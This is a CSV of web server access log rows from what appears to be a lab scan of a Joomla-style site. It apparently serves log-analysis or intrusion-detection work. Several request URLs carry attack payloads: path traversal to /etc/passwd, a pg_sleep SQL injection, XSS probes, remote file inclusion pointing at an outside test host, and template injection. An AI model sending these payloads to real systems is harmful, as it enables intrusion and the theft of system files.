,ip_address,remote_log_name,authenticated_user_name,timestamp,method,requesta_url,protocol,status_code,bytes_transferred,referrer_url,user_agent
1559,192.168.4.25,,,[22/Dec/2016:16:19:26 +0300],GET,//.././.././.././.././.././.././.././../etc/./passwd%2500/2-uncategorised/1-testsayfasi,HTTP/1.1,400,485,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1560,192.168.4.25,,,[22/Dec/2016:16:28:19 +0300],POST,/index.php/component/search/,HTTP/1.1,303,354,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1561,192.168.4.25,,,[22/Dec/2016:16:26:31 +0300],POST,/index.php/component/search/,HTTP/1.1,500,2023,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1562,192.168.4.25,,,[22/Dec/2016:16:19:16 +0300],POST,/index.php,HTTP/1.1,200,1809,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1563,192.168.4.25,,,[22/Dec/2016:16:25:20 +0300],POST,/index.php/component/search/,HTTP/1.1,303,412,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1564,192.168.4.25,,,[22/Dec/2016:16:40:15 +0300],POST,/index.php/component/users/?task=user.login,HTTP/1.1,303,385,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1565,192.168.4.25,,,[22/Dec/2016:16:22:17 +0300],POST,/index.php/component/search/,HTTP/1.1,303,399,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1566,192.168.4.25,,,[22/Dec/2016:16:29:56 +0300],POST,/index.php/component/search/,HTTP/1.1,500,2011,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1567,192.168.4.25,,,[22/Dec/2016:16:33:51 +0300],POST,/index.php/component/search/,HTTP/1.1,303,389,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1568,192.168.4.25,,,[22/Dec/2016:16:21:55 +0300],POST,/index.php/component/search/,HTTP/1.1,303,399,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1569,192.168.4.25,,,[22/Dec/2016:16:27:06 +0300],POST,/index.php/component/search/,HTTP/1.1,303,359,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1570,192.168.4.25,,,[22/Dec/2016:16:28:19 +0300],POST,/index.php/component/search/,HTTP/1.1,303,351,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1571,192.168.4.25,,,[22/Dec/2016:16:19:02 +0300],POST,/index.php,HTTP/1.1,200,1829,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1572,192.168.4.25,,,[22/Dec/2016:16:38:59 +0300],POST,/index.php/component/users/?task=registration.register,HTTP/1.1,200,237,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1573,192.168.4.25,,,[22/Dec/2016:16:19:12 +0300],GET,/index.php/component/content/?format=feed&type=atom&view=VRvUBjlU');select%20pg_sleep(6);%20--%20,HTTP/1.1,500,2087,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1574,192.168.4.25,,,[22/Dec/2016:16:34:19 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3053,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1575,192.168.4.25,,,[22/Dec/2016:16:36:37 +0300],GET,"/index.php/component/search/?searchword=ul.menu\""sTYLe='acu:Expre/**/SSion(kzsy(9310))'bad=\""&ordering=oldest&searchphrase=any&areas[0]=categories",HTTP/1.1,200,3323,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1576,192.168.4.25,,,[22/Dec/2016:16:38:20 +0300],POST,/index.php/component/users/?task=user.login,HTTP/1.1,303,385,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1577,192.168.4.25,,,[22/Dec/2016:16:39:42 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1578,192.168.4.25,,,[22/Dec/2016:16:21:41 +0300],POST,/index.php/component/search/,HTTP/1.1,303,379,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1579,192.168.4.25,,,[22/Dec/2016:16:31:01 +0300],POST,/index.php/component/search/,HTTP/1.1,200,2585,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1580,192.168.4.25,,,[22/Dec/2016:16:18:19 +0300],GET,/templates/beez_20/javascript/md_stylechanger.js,HTTP/1.1,200,1111,"http://192.168.4.161/index.php/component/users/?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)&view=reset","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1581,192.168.4.25,,,[22/Dec/2016:16:19:52 +0300],POST,/index.php/component/search/,HTTP/1.1,303,370,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1582,192.168.4.25,,,[22/Dec/2016:16:20:38 +0300],POST,/index.php/component/search/,HTTP/1.1,303,373,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1583,192.168.4.25,,,[22/Dec/2016:16:27:07 +0300],POST,/index.php/component/search/,HTTP/1.1,303,369,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1584,192.168.4.25,,,[22/Dec/2016:16:25:37 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3085,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1585,192.168.4.25,,,[22/Dec/2016:16:24:07 +0300],POST,/index.php/component/search/,HTTP/1.1,500,2017,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1586,192.168.4.25,,,[22/Dec/2016:16:19:05 +0300],GET,/index.php/component/content/?format=http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg&type=atom&view=featured,HTTP/1.1,500,2109,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1587,192.168.4.25,,,[22/Dec/2016:16:31:39 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1588,192.168.4.25,,,[22/Dec/2016:16:21:57 +0300],POST,/index.php/component/search/,HTTP/1.1,303,394,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1589,192.168.4.25,,,[22/Dec/2016:16:38:03 +0300],POST,/index.php/component/users/?task=user.login,HTTP/1.1,200,237,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1590,192.168.4.25,,,[22/Dec/2016:16:18:13 +0300],GET,/sdk/../../../../../../../../../../../../../etc/passwd,HTTP/1.1,400,485,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1591,192.168.4.25,,,[22/Dec/2016:16:37:32 +0300],POST,/index.php/component/users/?task=user.login,HTTP/1.1,200,237,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1592,192.168.4.25,,,[22/Dec/2016:16:39:40 +0300],POST,/index.php/component/users/?task=user.login,HTTP/1.1,303,385,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1593,192.168.4.25,,,[22/Dec/2016:16:22:46 +0300],POST,/index.php/component/search/,HTTP/1.1,303,371,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1594,192.168.4.25,,,[22/Dec/2016:16:25:35 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3087,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1595,192.168.4.25,,,[22/Dec/2016:16:21:27 +0300],POST,/index.php/component/search/,HTTP/1.1,303,393,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1596,192.168.4.25,,,[22/Dec/2016:16:20:05 +0300],POST,/index.php/component/search/,HTTP/1.1,303,352,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1597,192.168.4.25,,,[22/Dec/2016:16:37:04 +0300],GET,/index.php/2-uncategorised/1-testsayfasi?page=&print=!(()%26%26!%7c*%7c*%7c&tmpl=component,HTTP/1.1,200,1524,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1598,192.168.4.25,,,[22/Dec/2016:16:38:43 +0300],POST,/index.php/component/users/?task=user.login,HTTP/1.1,200,237,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1599,192.168.4.25,,,[22/Dec/2016:16:32:20 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3054,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1600,192.168.4.25,,,[22/Dec/2016:16:26:12 +0300],POST,/index.php/component/search/,HTTP/1.1,500,2023,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1601,192.168.4.25,,,[22/Dec/2016:16:25:28 +0300],POST,/index.php/component/search/,HTTP/1.1,500,2023,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1602,192.168.4.25,,,[22/Dec/2016:16:22:12 +0300],POST,/index.php/component/search/,HTTP/1.1,303,399,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1603,192.168.4.25,,,[22/Dec/2016:16:19:01 +0300],POST,/index.php,HTTP/1.1,200,1815,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1604,192.168.4.25,,,[22/Dec/2016:16:29:09 +0300],POST,/index.php/component/search/,HTTP/1.1,303,386,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1605,192.168.4.25,,,[22/Dec/2016:16:26:18 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3051,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1606,192.168.4.25,,,[22/Dec/2016:16:19:44 +0300],GET,/index.php/2-{{9999546*9999712}}/1-testsayfasi,HTTP/1.1,200,3287,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1607,192.168.4.25,,,[22/Dec/2016:16:24:31 +0300],POST,/index.php/component/search/,HTTP/1.1,303,414,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1608,192.168.4.25,,,[22/Dec/2016:16:26:48 +0300],POST,/index.php/component/search/,HTTP/1.1,303,394,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1609,192.168.4.25,,,[22/Dec/2016:16:29:54 +0300],POST,/index.php/component/search/,HTTP/1.1,303,373,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1610,192.168.4.25,,,[22/Dec/2016:16:33:45 +0300],POST,/index.php/component/search/,HTTP/1.1,303,4441,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1611,192.168.4.25,,,[22/Dec/2016:16:22:19 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3052,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1612,192.168.4.25,,,[22/Dec/2016:16:38:53 +0300],POST,/index.php/component/users/?task=registration.register,HTTP/1.1,200,237,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1613,192.168.4.25,,,[22/Dec/2016:16:27:26 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3084,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1614,192.168.4.25,,,[22/Dec/2016:16:31:00 +0300],POST,/index.php/component/search/,HTTP/1.1,303,373,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1615,192.168.4.25,,,[22/Dec/2016:16:22:25 +0300],POST,/index.php/component/search/,HTTP/1.1,500,2017,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1616,192.168.4.25,,,[22/Dec/2016:16:22:41 +0300],POST,/index.php/component/search/,HTTP/1.1,303,370,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1617,192.168.4.25,,,[22/Dec/2016:16:37:53 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3053,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1618,192.168.4.25,,,[22/Dec/2016:16:19:33 +0300],GET,/http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg/2-uncategorised/1-testsayfasi,HTTP/1.1,404,567,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1619,192.168.4.25,,,[22/Dec/2016:16:36:45 +0300],POST,/index.php,HTTP/1.1,303,368,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1620,192.168.4.25,,,[22/Dec/2016:16:38:55 +0300],POST,/index.php/component/users/?task=Http://testasp.vulnweb.com/t/fit.txt,HTTP/1.1,200,237,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1621,192.168.4.25,,,[22/Dec/2016:16:31:10 +0300],POST,/index.php/component/search/,HTTP/1.1,303,370,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1622,192.168.4.25,,,[22/Dec/2016:16:30:29 +0300],GET,/index.php?format=feed&type=../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd,HTTP/1.1,500,1983,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1623,192.168.4.25,,,[22/Dec/2016:16:39:08 +0300],POST,/index.php/component/users/?task=registration.register,HTTP/1.1,200,237,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1624,192.168.4.25,,,[22/Dec/2016:16:18:30 +0300],POST,/index.php,HTTP/1.1,200,1749,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1625,192.168.4.25,,,[22/Dec/2016:16:28:52 +0300],POST,/administrator/index.php,HTTP/1.1,500,1522,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1626,192.168.4.25,,,[22/Dec/2016:16:22:08 +0300],POST,/index.php/component/search/,HTTP/1.1,303,378,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1627,192.168.4.25,,,[22/Dec/2016:16:27:42 +0300],GET,/index.php/component/search/?searchword=&ordering=alpha&searchphrase=exact&areas[0]=categoriesacxScRiPtkzsy9658ScRiPt,HTTP/1.1,200,3158,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1628,192.168.4.25,,,[22/Dec/2016:16:38:10 +0300],POST,/index.php/component/users/?task=user.login,HTTP/1.1,200,237,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1629,192.168.4.25,,,[22/Dec/2016:16:34:25 +0300],POST,/index.php,HTTP/1.1,303,368,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1630,192.168.4.25,,,[22/Dec/2016:16:32:21 +0300],POST,/administrator/index.php,HTTP/1.1,303,382,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1631,192.168.4.25,,,[22/Dec/2016:16:27:29 +0300],POST,/index.php/component/search/,HTTP/1.1,303,371,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1632,192.168.4.25,,,[22/Dec/2016:16:35:27 +0300],GET,/index.php/component/search/?ordering=category&searchphrase=all&searchword=/WEB-INF/web.xml,HTTP/1.1,200,3167,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1633,192.168.4.25,,,[22/Dec/2016:16:31:15 +0300],POST,/index.php/component/search/,HTTP/1.1,303,415,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1634,192.168.4.25,,,[22/Dec/2016:16:19:07 +0300],POST,/index.php,HTTP/1.1,200,1750,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1635,192.168.4.25,,,[22/Dec/2016:16:27:52 +0300],POST,/index.php/component/search/,HTTP/1.1,500,2035,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1636,192.168.4.25,,,[22/Dec/2016:16:37:12 +0300],GET,/index.php/component/search/?searchword=acu5999%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca5999&ordering=oldest&searchphrase=any&areas[0]=newsfeeds,HTTP/1.1,200,3291,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1637,192.168.4.25,,,[22/Dec/2016:16:33:13 +0300],POST,/index.php,HTTP/1.1,303,368,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1638,192.168.4.25,,,[22/Dec/2016:16:20:09 +0300],POST,/index.php/component/search/,HTTP/1.1,303,359,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1639,192.168.4.25,,,[22/Dec/2016:16:26:17 +0300],POST,/index.php/component/search/,HTTP/1.1,303,373,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1640,192.168.4.25,,,[22/Dec/2016:16:24:25 +0300],POST,/index.php/component/search/,HTTP/1.1,303,368,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1641,192.168.4.25,,,[22/Dec/2016:16:31:31 +0300],POST,/index.php,HTTP/1.1,200,237,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1642,192.168.4.25,,,[22/Dec/2016:16:28:46 +0300],POST,/index.php/component/search/,HTTP/1.1,303,394,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1643,192.168.4.25,,,[22/Dec/2016:16:23:41 +0300],POST,/index.php/component/search/,HTTP/1.1,303,446,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1644,192.168.4.25,,,[22/Dec/2016:16:27:42 +0300],POST,/index.php/component/search/,HTTP/1.1,303,482,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1645,192.168.4.25,,,[22/Dec/2016:16:28:56 +0300],POST,/administrator/index.php,HTTP/1.1,500,1522,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1646,192.168.4.25,,,[22/Dec/2016:16:25:05 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3053,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1647,192.168.4.25,,,[22/Dec/2016:16:30:20 +0300],POST,/administrator/index.php,HTTP/1.1,303,382,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1648,192.168.4.25,,,[22/Dec/2016:16:38:50 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3054,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1649,192.168.4.25,,,[22/Dec/2016:16:27:36 +0300],POST,/index.php/component/search/,HTTP/1.1,303,376,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
1650,192.168.4.25,,,[22/Dec/2016:16:19:12 +0300],POST,/index.php,HTTP/1.1,200,1815,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
